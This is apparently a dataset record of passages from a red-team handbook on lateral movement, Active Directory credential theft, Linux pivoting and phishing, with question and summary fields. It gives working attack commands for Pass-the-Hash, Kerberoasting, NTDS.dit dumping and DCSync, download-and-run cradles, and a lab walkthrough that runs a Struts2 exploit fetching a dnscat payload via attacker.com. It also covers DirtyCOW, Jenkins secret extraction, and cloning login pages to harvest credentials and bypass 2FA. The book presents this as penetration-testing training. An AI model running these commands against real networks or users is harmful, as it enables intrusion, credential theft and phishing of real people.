DCOM\nfunctionalities.\nResources:\nhttps://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-\nround-2/\nhttps://enigma0x3.net/2017/09/11/lateral-movement-using-excel-\napplication-and-dcom/\nhttps://www.cybereason.com/blog/dcom-lateral-movement-\ntechniques\nPass-the-Hash\nThe old way of Pass-The-Hash (PTH) of local admin accounts has started to\ndisappear for the most part. Although not completely gone, let’s quickly review\nit. PTH attacks utilize the Windows NTLM hashes to authenticate to systems\ninstead of using a user's credentials. Why is this important? First off, hashes are\neasily recoverable using tools like Mimikatz, can be pulled for local accounts\n(but require local admin access), are recoverable from dumping the domain\ncontroller (not clear text passwords), and more.\nThe most basic use of PTH is attacking the local administrator. This is generally\nrare to find due to the fact that, by default, the local admin account is now\ndisabled and newer security features have surfaced, such as Local Administrator\nPassword Solution (LAPS) which creates random passwords for each\nworkstation. In the past, getting the hash of the local admin account on one\nworkstation was identical across the organization, meaning one compromise\ntook out the whole company.\nOf course, the requirements for this are that you have to be a local administrator\non the system, that the local administrator account \"administrator\" is enabled,\nand that it is the RID 500 account (meaning it has to be the original\nadministrator account and cannot be a newly created local admin account).\nCommand: shell net user administrator\nUser name Administrator\nFull Name\nComment Built-in account for administering the computer/domain\nUser's comment\nCountry/region code 000 (System Default)\nAccount active Yes\nAccount expires Never\nIf we see that the account is active, we can try to pull all the hashes from the\nlocal machine. Remember that this won't include any domain hashes:\nEmpire Module: powershell/credentials/powerdump\nMetasploit Module: http://bit.ly/2qzsyDI\nExample:\n(Empire: powershell/credentials/powerdump) > execute\nJob started: 93Z8PE\nOutput:\nAdministrator:500:\naad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d2b6cfc4470c1:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWe could either use Empire (credentials/mimikatz/pth) or we can boot up the\ntrusted psexec, submit our hashes, and execute our custom payloads, as seen in\nthe image below:\nAs previously mentioned, this is the old way of moving laterally and is a rare\nfind. If you are still looking at abusing Local Administrator accounts, but are in\nan environment that has LAPS (Local Administrator Password Solution), you\ncan use a couple of different tools to pull them out of Active Directory. This\nassumes you already have a privileged domain admin or helpdesk type account:\nhttps://github.com/rapid7/metasploit-\nframework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb\nldapsearch -x -h 10.100.100.200 -D \"elon.muskkat\" -w password -b\n\"dc=cyberspacekittens,dc=local\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-\nAdmPwd [https://room362.com/post/2017/dump-laps-passwords-\nwith-ldapsearch/]\nThis is a great way to keep moving laterally without burning your helpdesk\nuseraccount.\nGaining Credentials from Service Accounts\nWhat if you find yourself in a scenario where you are a limited user, can't pull\npasswords from memory, and had no luck with passwords on the host system...\nwhat do you do next? Well, one of my favorite attacks is called Kerberoasting.\nWe all know that there are flaws with NTLM due to one-way hashes with no\nsalts, replay attacks, and other traditional problems, which is why many\ncompanies have been moving to Kerberos. As we know, Kerberos is a secure\nmethod for authenticating a request for a service in a computer network. We\nwon't go too deep into the implementation of Kerberos in Windows. However,\nyou should know that the Domain Controller typically acts as the Ticket\nGranting Server; and users on the network can request Ticket Granting Tickets\nto gain access to resources.\nWhat is the Kerberoast attack? As an attacker, we can request Kerberos service\ntickets for any of the SPNs of a target service account that we pulled earlier.\nThe vulnerability lies in the fact that when a service ticket is requested from the\nDomain Controller, that ticket is encrypted with the associated service user’s\nNTLM hash. Since any ticket can be requested by any user, this means that, if\nwe can guess the password to the associated service user’s NTLM hash (that\nencrypted the ticket), then we now know the password to the actual service\naccount. This may sound a bit confusing, so let's walk through an example.\nSimilar to what we did before, we can list all the SPN services. These are the\nservice accounts for which we are going to pull all the Kerberos tickets:\nsetspn -T cyberspacekittens.local -F -Q /\nWe can either target a single user SPN or pull all the user Kerberos tickets into\nour user's memory:\nTargeting a single User:\npowershell Add-Type -AssemblyName\nSystem.IdentityModel; New-Object\nSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken\n-ArgumentList \"HTTP/CSK-\nGITHUB.cyberspacekittens.local\"\nPulling All User Tickets into Memory\npowershell Add-Type -AssemblyName\nSystem.IdentityModel; IEX (New-Object\nNet.WebClient).DownloadString(\"https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1\")\n| ForEach-Object {try{New-Object\nSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken\n-ArgumentList $_.ServicePrincipalName}catch{}}\nOf course, you can also do this with PowerSploit:\nhttps://powersploit.readthedocs.io/en/latest/Recon/Invoke-\nKerberoast/\nIf successful, we have imported either one or many different Kerberos tickets\ninto our victim computer's memory. We now need a way to extract the tickets.\nTo do this, we can use good ol' Mimikatz Kerberos Export:\npowershell.exe -exec bypass IEX (New-Object\nNet.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-\nMimikatz -Command '\"\"\"kerberos::list /export\"\"\"'\nOnce we export the tickets, they will reside on our victim's machine. We will\nhave to download them off of their systems before we can start cracking them.\nRemember that the tickets are encrypted with the service account's NTLM hash.\nSo, if we can guess that NTLM hash, we can read the ticket, and now know the\nservice account’s password as well. The easiest way to crack accounts is using a\ntool called tgsrepcrack (JTR and Hashcat do also support cracking Kerberoast,\nwhich we will talk about in a second).\nUsing Kerberoast to crack tickets:\ncd /opt/kerberoast\npython tgsrepcrack.py [password wordlist] [kirbi tickets -\n*.kirbi]\nIn this case, the password for the service account csk-github was “P@ssw0rd!”\nOf course, there is a PowerShell module in Empire that does all the hard work\nfor us. This is located under powershell/credentials/invoke_kerberoast\n( https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-\nKerberoast.ps1). You can output the results in John the Ripper or even Hashcat\nformats to crack the passwords. I have previously had some issues running the\nPowerShell script in very large environments, so the fallback is to use\nPowerShell and Mimikatz to pull all the tickets down.\nDumping the Domain Controller Hashes\nOnce we have obtained Domain Administrative access, the old way to pull all\nthe hashes from the DC was to run commands on the domain controller and use\nShadow Volume or Raw copy techniques to pull off the Ntds.dit file.\nReviewing the Volume Shadow Copy Technique\nSince we do have access to the file system and can run commands on the domain\ncontroller, as an attacker, we want to grab all the Domain hashes stored in the\nNtds.dit file. Unfortunately, that file is constantly being read/written to and even\nas system, we do not have access to read or copy that file. Luckily for us, we\ncan take advantage of a Windows feature called Volume Shadow Copy Service\n(VSS), which will create a snapshot copy of the volume. We can then read the\nNtds.dit file from that copy and pull it off the machine. This would include\nstealing the Ntds.dit, System, SAM, and Boot Key files. Lastly, we need to\nclean our tracks and delete the volume copy:\nC:\\vssadmin create shadow /for=C:\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit\n.\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM\n.\ncopy \\\\?\n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM\n.\nreg SAVE HKLM\\SYSTEM c:\\SYS\nvssadmin delete shadows /for= [/oldest | all | shadow=]\nNinjaCopy\nNinjaCopy (http://bit.ly/2HpvKwj) is another tool that, once on the Domain\nController, can be used to grab the Ntds.dit file. NinjaCopy \"copies a file from\nan NTFS partitioned volume by reading the raw volume and parsing the NTFS\nstructures. This bypasses file DACL's, read handle locks, and SACL's. You must\nbe an administrator to run the script. This can be used to read SYSTEM files\nwhich are normally locked, such as the NTDS.dit file or registry hives.”\n[http://bit.ly/2HpvKwj]\nInvoke-NinjaCopy -Path \"c:\\windows\\ntds\\ntds.dit\" -\nLocalDestination \"c:\\windows\\temp\\ntds.dit\"\nDCSync\nNow that we have reviewed the old methods of pulling hashes from the DC—\nwhich required you to run system commands on the DC and generally drop files\non that machine—let’s move onto the newer methods. More recently, DCSync,\nwritten by Benjamin Delpy and Vincent Le Toux, was introduced and changed\nthe game on dumping hashes from Domain Controllers. The concept of DCSync\nis that it impersonates a Domain Controller to request all the hashes of the users\nin that Domain. Let that sink in for a second. This means, as long as you have\npermissions, you do not need to run any commands on the Domain Controller\nand you do not have to drop any files on the DC.\nFor DCSync to work, it is important to have the proper permissions to pull\nhashes from a Domain Controller. Generally limited to the Domain Admins,\nEnterprise Admins, Domain Controllers groups, and anyone with the Replicating\nChanges permissions set to Allow (i.e., Replicating Changes All/Replicating\nDirectory Changes), DCSync will allow your user to perform this attack. This\nattack was first developed in Mimikatz and could be run with the following\ncommand:\nLsadump::dcsync domain:[YOUR DOMAIN] user:\n[Account_to_Pull_Hashes]\nEven better, DCSync was pulled into tools like PowerShell Empire to make it\neven easier.\nModule for Empire: powershell/credentials/mimikatz/dcsync_hashdump\nLooking at the DCSync hashdump, we see all the NTLM hashes for the users in\nActive Directory. Additionally, we have the krbtgt NTLM hash, which means\nwe now (or in future campaigns) can perform Golden Ticket attacks.\nLateral Movement via RDP over the VPS\nIn today's world, with a ton of Next Gen AV, running WMI/PowerShell\nRemoting/PSExec laterally between computers isn't always the best option. We\nare also seeing that some organizations are logging all Windows Command\nprompts. To get around all of this, we sometimes need to go back to basics for\nlateral movement. The issue with using VPS servers is that it is only a shell with\nno GUI interface. Therefore, we will route/proxy/forward our traffic from our\nattacker host, through the VPS, through our compromised hosts, and finally\nlaterally to our next victim. Luckily for us, we can use native tools to\naccomplish most of this.\nFirst, we will need to set up a VPS server, enable ports from the internet,\nconfigure Metasploit with PTF, and infect your initial victim with Meterpreter.\nWe could do this with Cobalt Strike or other frameworks, but we will use\nMeterpreter in this case.\nWe can take advantage of the default SSH client by using Local Port Forwarding\n(-L). In this scenario, I am using my Mac, but this could be done on a Windows\nor Linux system as well. We are going to connect to our VPS over SSH using\nour SSH key. We are also going to configure a local port, in this case 3389\n(RDP), on our attacker machine to forward any traffic made to that port to our\nVPS. When that traffic over that port is forwarded to our VPS, it will then send\nthat traffic to localhost on port 3389 on the VPS. Finally, we need to set up a\nport listening on our VPS on port 3389 and set up a port forward through our\ncompromised victim using Meterpreter's port forward feature to route to our\nvictim's system.\n1. Infect our victim with a Meterpreter payload.\n2. SSH from our attacker machine and set up the Local Port Forward on\nour attacker system (listen on port 3389 locally) to send all traffic\ndestined for that port to the VPS's localhost port on 3389.\nssh -i key.pem ubuntu@[VPS IP] -L\n127.0.0.1:3389:127.0.0.1:3389\n3. Set up a port forward on the Meterpreter session to listen on the VPS\non port 3389 and send that traffic through our Infected Machine to\nthe next lateral movement server\nportfwd add -l 3389 -p 3389 -r [Victim via RDP IP\nAddress]\n4. On our Attacker Machine, open our Microsoft Remote Desktop\nClient, set your connection to your own localhost - 127.0.0.1 and\nenter the Victim's credentials to connect via RDP.\nPivoting in Linux\nPivoting in Linux hasn't changed too much over the years. Usually if you are\nusing something like dnscat2 or Meterpreter, they all support their own\nforwarding.\ndnscat2:\nlisten 127.0.0.1:9999 <target_IP>:22\nMetasploit\npost/windows/manage/autoroute\nMetasploit Socks Proxy + Proxychains\nuse auxiliary/server/socks4a\nMeterpreter:\nportfwd add –l 3389 –p 3389 –r <target_IP>\nIf you are lucky to get an SSH shell, there are a number of ways we can pivot\nthrough that system. How might we get an SSH shell? In many cases, once we\nget either Local File Inclusion (LFI) or Remote Code Execution (RCE), we can\ntry to privilege escalate to read the etcshadow file (and password crack) or we\ncan pull some Mimikatz style trickery.\nJust like Windows and Mimikatz, Linux systems also run into the same issue\nwhere passwords are be stored in clear text. A tool written by @huntergregal\ndumps specific processes that have a high probability of containing the user's\npasswords in clear text. Although this only works on a limited number of Linux\nsystems to date, the same concepts can be used across the board. You can see\nexactly what systems and from where passwords are being grabbed here:\nhttps://github.com/huntergregal/mimipenguin.\nOnce we get credentials on our compromised hosts and can SSH back in, we can\ntunnel our traffic and pivot between boxes. Within SSH, we have some great\nfeatures that allow us to perform this pivoting:\nSetting up Dynamic Sock Proxy to use proxychains to pivot all of\nour traffic through our host:\nssh -D 127.0.0.1:8888 -p 22 <user>@<Target_IP>\nBasic Port Forwards for a single port:\nssh <user>@<Target_IP> -L 127.0.0.1:55555:\n<Target_to_Pivot_to>:80\nVPN over SSH. This is an awesome feature that makes it possible to\ntunnel layer 3 network traffic of SSH.\nhttp://bit.ly/2EMpPfb\nPrivilege Escalation\nLinux Privilege escalation is just like Windows, for the most part. We look for\nvulnerable services that we can write to, sticky bit misconfigurations, passwords\nin flat files, world-writable files, cronjobs, and, of course, patching issues.\nIn terms of effectively and efficiently parsing a Linux box for privilege\nescalation issues, we can use a few tools to do all the legwork for us.\nBefore we do any sort of privilege escalation exploits, I like to first get a good\nread on the Linux host and identify all the information about the system. This\nincludes users, services, cronjobs, versions of software, weak creds,\nmisconfigured file permissions, and even docker information. We can use a tool\ncalled LinEnum to do all the dirty work for us\n(https://github.com/rebootuser/LinEnum).\nThis is a very long report on everything you could ever want to know about the\nunderlying system and is great to have for future campaigns.\nOnce we gain information about the system, we try to see if we can exploit any\nof these vulnerabilities. If we can't find any sticky bit vulnerabilities or abuse\nmisconfigurations in services/cronjobs, we go straight for exploits on the\nsystem/applications. I try to do these last as there is always a potential\npossibility to halt/brick the box.\nWe can run a tool called linux-exploit-suggester (https://github.com/mzet-/linux-\nexploit-suggester) to analyze the host system and identify missing patches and\nvulnerabilities. Once a vulnerability is identified, the tool will also provide you\nwith a link to the PoC exploit.\nNow, what are we looking for to exploit? This is where experience and practice\nreally come into play. In my lab, I will have a huge number of different Linux\nversions configured to validate that these exploits won't crash the underlying\nsystem. One of my favorite vulnerabilities in this scenario is DirtyCOW.\nDirtyCOW is \"a race condition was found in the way Linux kernel's memory\nsubsystem handled breakage of the read only private mappings COW situation\non write access. An unprivileged local user could use this flaw to gain write\naccess to otherwise read only memory mappings and thus increase\ntheir privileges on the system.” [https://dirtycow.ninja/]\nIn short, this vulnerability allows an attacker to go from a non-privileged user to\nroot via kernel vulnerabilities. This is the best type of privilege escalation we\ncould ask for! The one issue though is that it is known to cause kernel panics, so\nwe have to make sure to use the right versions on the right Linux kernels.\nTesting DirtyCOW on Ubuntu (ubuntu 14.04.1 LTS 3.13.0-32-generic x86_64):\nDownload the DirtyCOW payload\nwget http://bit.ly/2vdh2Ub -O dirtycow-mem.c\nCompile the DirtyCOW payload\ngcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread\nRun DirtyCOW to get to system\n./dirtycow-mem\nTurn off periodic writeback to make the exploit stable\necho 0 > procsys/vm/dirty_writeback_centisecs\nTry reading the shadow file\ncat etcshadow\nLinux Lateral Movement Lab\nThe problem with lateral movement is that it is hard to practice without having\nan environment set up to pivot. So, we present you the CSK Secure Network\nLab. In this lab, you are going to pivot between boxes, use recent exploits and\nprivilege escalation attacks, and live off the land in a Linux environment.\nSetting Up the Virtual Environment The setup for this virtual environment lab is\nslightly complex. This is because the network is going to require three different\nstatic virtual machines to run and there is some prior setting up required on your\npart. All this is tested in VMWare Workstation and VMware Fusion, so if you\nare using VirtualBox, you might have to play around with it.\nDownload the Three Virtual Machines:\nhttp://thehackerplaybook.com/get.php?type=csk-lab\nAlthough you should not need the root accounts for these boxes, here\nis the username/password, just in case: hacker/changeme.\nAll three of the virtual machines are configured to use the NAT Networking\nInterface. For this lab to work, you will have to configure your Virtual\nMachine's NAT settings in VMWare to use the 172.16.250.0/24 network. To do\nthis in Windows VMWare Workstation:\nIn the menu bar, go to Edit -> virtual network editor -> change\nsettings\nSelect the interface for type NAT (mine is VMnet8)\nChange Subnet IP 172.16.250.0 and hit apply\nIn OSX, it is more complicated. You will need to:\nCopy the original dhcpd.conf as a backup\nsudo cp LibraryPreferences/VMware\\\nFusion/vmnet8/dhcpd.conf LibraryPreferences/VMware\\\nFusion/vmnet8/dhcpd.conf.bakup\nEdit the dhcpd.conf file to use 172.16.250.x instead of the\n192.168.x.x networks\nsudo vi LibraryPreferences/VMware\\\nFusion/vmnet8/dhcpd.conf\nEdit the nat.conf to use the correct gateway\nsudo vi LibraryPreferences/VMware\\\nFusion/vmnet8/nat.conf\n# NAT gateway address\nip = 172.16.250.2\nnetmask = 255.255.255.0\nRestart the service:\nsudo ApplicationsVMware\\\nFusion.app/ContentsLibraryservices/services.sh --stop\nsudo ApplicationsVMware\\\nFusion.app/ContentsLibraryservices/services.sh --start\nNow, you should be able start your THP Kali VM in NAT mode and get a\nDHCP IP in the 172.16.250.0/24 range. If you do, boot up all three other lab\nboxes at the same time and start hacking away.\nAttacking the CSK Secure Network\nYou have finally pivoted your way out of the Windows environment into the\nsecure production network. From all your reconnaissance and research, you\nknow that all the secrets are stored here. This is one of their most protected\nnetworks and we know they have segmented their secure infrastructure. From\ntheir documentation, it looks like there are multiple VLANS to compromise and\nit seems you will have to pivot between boxes to get to the vault database. This\nis everything you have trained for…\nPivoting to the outside of the Secure Network area, you see that the network\nrange configured for this environment is in the 172.16.250.0/24 network. Since\nyou don't know too much about this network, you start by kicking off some very\nlight nmap scans. You need to identify which systems are accessible from\noutside this network in order to determine how you can start your attack.\nScan the Secure Network:\nnmap 172.16.50.0/24\nYou notice there are three boxes up and running, but only one of them has web\nports enabled. It looks like the other two boxes are isolated from outside the\nsecure network, which means we will have to compromise the 172.16.250.10\nbox first to be able to pivot into the other two servers. Visiting the first box\n(172.16.250.10), you see that Apache Tomcat is listening on port 8080 and some\nopenCMS is on port 80. Running a web fuzzer you notice that the openCMS\npage is also running Apache Struts2 (/struts2-showcase). Instantly, flashbacks of\nthe Equifax breach hit you like a brick. You think to yourself, this is too good to\nbe true, but you have to check anyway. You run a quick search on msfconsole\nand test the exploit \"struts2_content_type_ognl\".\nWe know that CSK heavily monitors their protected network traffic and their\ninternal servers may not allow direct access to the corporate network. To get\naround this, we are going to have to use our DNS C2 payload with dnscat2 to\ncommunicate over UDP instead of TCP. Of course in the real world, we might\nuse an authoritative DNS server, but for lab sake, we will be our own DNS\nserver.\n[THP Kali Machine]\nThe THP Kali custom virtual machine should have all the tools to perform the\nattacks.\nWe need to host our payload on a webserver, so that we can have our\nMetasploit payload grab the dnscat malware. Inside the dnscat2\nclient folder is the dnscat binary.\ncd optdnscat2/client/\npython -m SimpleHTTPServer 80\nStart a dnscat server\ncd optdnscat2/server/\nruby ./dnscat2.rb\nRecord your secret key for dnscat\nOpen a New Terminal and load Metasploit\nmsfconsole\nSearch for struts2 and load the struts2 exploit\nsearch struts2\nuse exploit/multi/http/struts2_content_type_ognl\nConfigure the struts2 exploit to grab our dnscat payload and execute\non the victim server. Make sure to update your IP and secret key\nfrom before.\nset RHOST 172.16.250.10\nset RPORT 80\nset TARGETURI struts2-showcase/showcase.action\nset PAYLOAD cmd/unix/generic\nset CMD wget http://<your_ip>/dnscat -O tmpdnscat &&\nchmod +x tmpdnscat && tmpdnscat --dns\nserver=attacker.com,port=53 --secret=<Your Secret Key>\nrun\nOnce the payload executes, you will not get any sort of confirmation\nin Metasploit as we used a dnscat payload. You will need to check\nyour dnscat server for any connections using DNS traffic.\nBack on your dnscat2 server, check your newly executed payload\nand create a shell terminal.\nInteract with your first payload\nwindow -i 1\nSpawn a Shell process\nshell\nGo back to the main menu with the keyboard buttons\nctrl + z\nInteract with your new shell\nwindow -i 2\nType in shell commands\nls\nYou have compromised the OpenCMS/Apache Struts server! Now what? You\nspend some time reviewing the server and looking for juicy secrets. You\nremember that the server is running the OpenCMS web application and identify\nthat the app is configured under opttomcat/webapps/kittens. In reviewing the\nconfiguration file of the OpenCMS properties, we find the database, username,\npassword, and IP address of 172.16.250.10.\nRetrieving the database information:\ncat opttomcat/webapps/kittens/WEB-INF/config/opencms.properties\nWe connect to the database, but we do not see much. The problem is that we are\ncurrently a limited tomcat user, which is really hindering our attack. Therefore,\nwe need to find a way to escalate. Running post exploitation reconnaissance\n(uname -a && lsb_release -a) on the server, you identify that this is a pretty old\nversion of Ubuntu. Luckily for us, this server is vulnerable to the privilege\nescalation vulnerability DirtyCOW. Let's create a DirtyCOW binary and get to\nroot!\nPrivilege Escalation through dnscat:\nDownload and compile DirtyCOW:\ncd /tmp\nwget http://bit.ly/2vdh2Ub -O dirtycow-mem.c\ngcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread\n./dirtycow-mem\nTry to keep the DirtyCOW exploit stable and allow reboots for\nkernel panics\necho 0 > procsys/vm/dirty_writeback_centisecs\necho 1 > procsys/kernel/panic && echo 1 >\nprocsys/kernel/panic_on_oops&& echo 1 >\nprocsys/kernel/panic_on_unrecovered_nmi && echo 1 >\nprocsys/kernel/panic_on_io_nmi && echo 1 >\nprocsys/kernel/panic_on_warn\nwhoami\nNote: DirtyCOW is not a very stable privilege escalation. If you are having\nproblems with your exploit, check out my GitHub page for a more stable process\nof creating a setuid binary here:\nhttps://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab\nIf you are still having problems, the other option is to log into the\ninitial server over SSH and execute the dnscat payload as root. To\nlog in, use the credentials hacker/changeme and sudo su - to root.\nNow, you have become root on the system due to the lack of patching on the\nhost system. As you start pillaging the box for secrets again, you come across\nroot's bash history file. Inside this file you find an SSH command and private\nSSH key reference. We can take this SSH key and log into our second box,\n172.16.250.30:\ncat ~/.bash_history\nhead ~/.ssh/id_rsa\nssh -i ~/.ssh/id_rsa root@172.16.250.30\nYou spend some time on the second box and try to understand what it is used\nfor. Searching around, you notice there is a Jenkins user in the /home directory,\nwhich leads you to identify a Jenkins service running on port 8080. How can we\nuse our browser to see what's on the Jenkins server? This is where dnscat's port\nforward feature comes into play. We need to back out of our initial shell and go\nto the command terminal. From there, we need to set up a listener to forward\nour traffic from our attacker machine, through the dnscat, to the Jenkins box\n(172.16.250.30) over port 8080.\nExecute a dnscat port forward:\nBack out of our current shell\nCtrl + z\nGo back to our first command agent and set up a listener/port\nforward\nwindow -i 1\nlisten 127.0.0.1:8080 172.16.250.30:8080\nOn your THP Kali VM, go to a browser and use our port forward (it\nwill be very slow over DNS):\nhttp://127.0.0.1:8080/jenkins\nInside the credential manager within the Jenkins app, we are going to see that the\ndb_backup user password is stored, but not visible. We need to figure out a way\nto get this credential out of Jenkins, so that we can continue to move laterally.\nn00py did some great research on stored credentials within Jenkins and how to\nextract them (http://bit.ly/2GUIN9s). We can take advantage of this attack using\nour existing shell and to grab the credentials.xml, master.key, and\nhudson.util.Secret files.\nGo back to the main menu in dnscat and interact with your original\nshell\nCtrl + z\nwindow -i 2\nGo to the Jenkins' home directory and grab the three files:\ncredentials.xml, master.key, and hudson.util.Secret.\ncd homeJenkins\nWe can either try to download these files off or we could base64\nthese files and copy them off via the current shell.\nbase64 credentials.xml\nbase64 secrets/hudson.util.Secret\nbase64 secrets/master.key\nWe can copy the base64 output back onto our Kali box and decode\nthem to reverse the password for the db_backup user.\ncd optjenkins-decrypt\necho \"<base64 hudson.util.Secret>\" | base64 --decode >\nhudson.util.Secret\necho \"<base64 master.key >\" | base64 --decode >\nmaster.key\necho \"<base64 credentials.xml >\" | base64 --decode >\ncredentials.xml\nDecrypt the password using https://github.com/cheetz/jenkins-\ndecrypt\npython3 ./decrypt.py master.key hudson.util.Secret\ncredentials.xml\nWe were able to successfully decrypt the db_backup user's password of\n\")uDvra{4UL^;r?*h\". If we look back at our earlier notes, we see in the\nOpenCMS properties file that the database server was located on 172.16.250.50.\nIt looks like this Jenkins server, for some reason, performs some sort of backup\nagainst the database server. Let's check if we can take our credentials of\ndb_backup: )uDvra{4UL^;r?*h to log into the database server via SSH. The\nonly problem is that through our dnscat shell, we don't have direct standard input\n(STDIN) to interact with SSH's password prompt. So, we will have to use our\nport forward again to pass our SSH shell from our THP Kali VM, through the\ndnscat agent, to the database server (172.16.250.50).\nGo back to the command shell\nCtrl + z\nwindow -i 1\nCreate a new port forward to go from localhost to the database server\nat 172.16.250.50\nlisten 127.0.0.1:2222 172.16.250.50:22\nOnce on the database server (172.16.250.50) with the db_backup account, we\nnotice that this account is part of the sudoers file and can sudo su to root. Once\nroot on the database server, we poke around, but can't find any credentials to\naccess the database. We could reset the root DB password, but that might end\nup breaking some of the other applications. Instead, we search for the different\ndatabases located under varlib/mysql and come across a cyberspacekittens\ndatabase. Here, we find the secrets.ibd file that holds all the data for the secrets\ntable. As we read through the data, we realize that it might be encrypted… It is\nup to you to figure out the rest…\nCongrats!!! You have successfully compromised the Cyber Space Kittens\nnetwork!\nDon't stop here… There are many things you can do with these boxes; we have\nonly touched the surface. Feel free to play around on these systems, find more\nsensitive files, figure out other ways to privilege escalate, and more. For\nreference, in this lab, the environment topology is represented below:",
    "question": "What are the common techniques for lateral movement in a network, and how can they be used to gain access to remote systems?",
    "summary": "The text discusses various methods for lateral movement in network attacks, including using Active Directory permissions, Empire and Metasploit modules for remote execution, and DCOM for executing remote binaries. It also covers techniques like Pass-The-Hash, Kerberoasting, and DCSync for gaining access to domain controller hashes. Additionally, it explains how to pivot between systems using RDP over a VPS and SSH tunneling in both Windows and Linux environments. The text concludes with a detailed example of a Linux lateral movement lab, where attackers use tools like DirtyCOW for privilege escalation and dnscat for communication and data exfiltration."
  },
  {
    "start": 77,
    "end": 81,
    "text": "Conclusion\nIn this chapter, we went through Compromising the Network. We started either\non the network with no credentials or social engineered our way to our first\nvictim box. From there, we were able to live off the land, gain information\nabout the network/systems, pivot around boxes, escalate privileges, and\nultimately compromise the whole network. This was all accomplished with\nminimal scanning, using features of the network, and trying to evade all sources\nof detection.\n5 the screen - social engineering\nBuilding Your Social Engineering (SE) Campaigns\nAs Red Teamers, we love social engineering (SE) attacks. Not only because it\ncan generally comprise of low skillset attacks, but because it is also easy to craft\na highly trustworthy campaign at very low cost. Just set up a couple of fake\ndomains, servers, craft some emails, drop some USB sticks, and call it a day.\nIn terms of metrics, we capture the obvious things like the number of emails\nsent, number of users who clicked on the link, and number of users that type in\ntheir password. We also try to get creative and bring substantive value to the\ncompanies who hire us. An example of this is DefCon’s Social Engineering\nCompetition, where competitors social engineer call centers and employees. If\nyou aren't familiar with this competition, these competitors have a limited\namount of time to find a number of flags based on the company. Flags can be\ncaptured by gaining company information such as their VPN, what type of AV\nthey use, employee-specific information, or being able to get an employee to\nvisit a URL, and more. If you want to see all the flags used in the competition,\ncheck out the 2017 competition report: http://bit.ly/2HlctvY. These types of\nattacks can help a company increase internal awareness by teaching their\nemployees how to spot evil and report them to the proper teams.\nIn this chapter, we are going to lightly touch on some of the tools and techniques\nwe use to run our campaigns. With SE style attacks, there are no right or wrong\nanswers. As long as they work, it's all good in our book.\nDoppelganger Domains\nWe talked a lot about this in THP2. This is still one of the most successful ways\nto get that initial credential or drop malware. The most common technique is to\npurchase a domain that is very similar to a company’s URL or is a common\nmistype of their URL.\nIn the last book, we had an example where if we had\nmail.cyberspacekittens.com, we would purchase the domain\nmailcyberspacekittens.com and set up a fake Outlook page to capture\ncredentials. When the victims go to the fake site and type in their password, we\nwould collect that data and redirect them to the company's valid email server\n(mail.cyberspacekittens.com). This gives them the impression that they just\naccidentally mistyped their password the first time and therefore proceed with\ntheir login once more.\nThe best part of all of this is that you don't really have to do any phishing.\nSomeone will mistype or forget the period (.) between “mail” and\n“cyberspacekittens”, then type in their credentials. We have had victims\nbookmark our malicious site and come back every day.\nHow to Clone Authentication Pages\nOne of the best tools to quickly clone web application authentication pages is the\nSocial Engineering Toolkit (SET) by TrustedSec. This is a standard tool for any\nSE campaign where gaining credentials is a priority. You can download SET at\nhttps://github.com/trustedsec/social-engineer-toolkit.\nSetting Up SET\nConfigure SET to Use Apache (versus the default Python)\nModify the config file to the following\ngedit etcsetoolkit/set.config\nAPACHE_SERVER=ON\nAPACHE_DIRECTORY=varwww/html\nHARVESTER_LOG=varwww/html\nStart Social Engineering Toolkit (SET)\ncd optsocial-engineer-toolkit\nsetoolkit\n1) Spear-Phishing Attack Vectors\n2) Website Attack Vectors\n3) Credential Harvester Attack Method\n2) Site Cloner\nIP of your attacker server\nSite to Clone\nOpen a Browser and go to your attacker server and test\nAll files will be stored under varwww/html and passwords under harvester*.\nSome best practices when cloning pages for Social Engineering campaigns:\nMove your Apache server to run over SSL\nMove all images and resources locally (instead of calling from the\ncloned site)\nPersonally, I like to store all recorded passwords with my public pgp\nkey. This way, if the server is compromised, there is no way to\nrecover the passwords without the private key. This can all be\nsupported with PHP gnupg_encrypt and gnupg_decrypt.\nCredentials with 2FA\nWe are seeing more customers with two factor authentication (2FA). Although\n2FA is a big pain for Red Teams, they aren't impossible to get around.\nHistorically, we have had to create custom pages that would handle some of this,\nbut now we have ReelPhish. ReelPhish, a tool made by FireEye, allows a Red\nTeam to utilize Selenium and Chrome to trigger the 2FA automatically when a\nvictim enters credentials on our phishing page.\nReelPhish https://github.com/fireeye/ReelPhish:\nClone victim site that requires 2FA authentication\nOn your own Attacker Box, parse the traffic required to log into the\nreal site. In my case, I open Burp Suite and get all the post\nparameters required to authenticate\nModify the Clone Site so that it uses ReelPhish. See the .\nexamplesitecodesamplecode.php and input all the necessary\nparameters your authentication requires\nVictim falls for cloned site and authenticates\nCredentials are pushed back to the attacker\nReelPhish will authenticate to the Real Site, triggering 2FA\nVictim receives 2FA code or phone push\nVictim is redirected to the real site to log in again (thinking they\nfailed the initial time)\nAs reflected in the following image, we should now have an authenticated\nsession bypassing 2FA. Although it does looks like it supports Linux, I have had\nsome issues getting it to run in Kali. Running it in Windows is preferred. You\ncan find more information on ReelPhish on FireEye's Website:\nhttps://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-\nfactor-phishing-tool.html.\nThere are a few other tools that handle different 2FA bypasses as well:\nhttps://github.com/kgretzky/evilginx\nhttps://github.com/ustayready/CredSniper\nOne thing I want to mention about authenticating to 2FA resources is to make\nsure you verify all the different authentication methods once you have\ncredentials. What I mean by this is that they may have 2FA for the web\nauthentication portal, but it might not be required for APIs, older thick clients, or\nall application endpoints. We have 